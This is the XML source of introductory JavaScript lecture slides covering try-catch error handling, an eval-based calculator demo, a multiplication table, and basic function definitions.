              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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break</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF2CF0E0-7C44-4998-9F25-CFD6D8A060D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Dealing with Errors: try-catch - finally</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C54AD8DE-9850-4D08-B1E1-40562CE5D149}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If you don't want your program crashing and ceasing to run ("error on page"), you should capture the exceptions with try-catch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Syntax:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:b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try</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code which can cause an exception</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e.g. eval(), unknown reference</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catch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error</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code to process the error</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error is the object containing</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the exception message</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finally</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always executed, optional part</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2FE05E2-9474-40C9-8606-1A0AD1CBE545}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Simple "Calculator" Using Eval</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74191554-98D1-48C8-849A-78C3F3435949}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5069160"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</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html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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt;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head</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title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>title</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meta</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charset</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"utf-8"</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head</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body</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Simple</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programmable</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calculator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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true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var</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input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prompt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input</a:t>
            </a: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break</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try</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var</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result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>eval</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input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alert</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input</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 =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\n</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result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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>catch</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error</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alert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Error</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: "</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error</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body</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI"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405531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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9563B592-6AC8-42B5-8884-4BE74B4449E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>10x10 Multiplication Table</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53251" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{61822EFB-6353-4617-BA44-296A71108AF2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</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html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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;html</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lang</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"en"</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head</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meta</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charset</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"UTF-8"</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meta</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viewport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content</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width</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device-width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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initial-scale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1.0"</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title</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Document</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title</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head</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body</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const</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>N</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10</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>table</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style</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font-family:monospace</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summary</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border</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>='1'&gt;"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AF00DB"/>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y</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y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt;= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>N</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y</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tr</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AF00DB"/>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&lt;= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>N</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`&lt;td </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>style</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="width:4em"&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>${</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE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td&gt;`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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>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tr</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write</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>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table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"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body</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="fi-FI" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B06090202040302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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4BB448E-6FEA-416A-8CFD-59981A699648}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Defining and Calling Functions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72377433-4429-4E4A-A019-0A2EE1062A7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612491" y="1427611"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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Define a function:</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functionName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parameters</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function body</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Return exits from a function and can return a value</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square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 * </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Nameless functions (lambdas) are also possible or assign name later</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sqr</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 * </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</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Call a function</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functionName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parameters</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"square of 4 is "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>square</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4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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72102819-D1B9-44CD-AFF0-CCD176EB843E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Different Kind of Functions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55299" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0C45B2C0-448A-41BB-9D27-F8766226984B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5213176"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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function which takes arguments and returns something</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perhaps the best kind of function IF it has no side effects</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inchesToCm</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inch</a:t>
            </a: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inch</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2.54</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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function which takes arguments, but has no return value</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printMany</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s</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a:t>
            </a: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while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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-- &gt;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console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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function which takes no arguments, but has a return value</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tellSecret</a:t>
            </a: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"secret is you"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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function which takes no arguments and has no return value</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theEnd</a:t>
            </a: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console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</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"This is the end."</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>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console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">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inchesToCm</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12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">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toFixed</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round to nearest 1 decimal precision</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printMany</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"Hello"</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3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
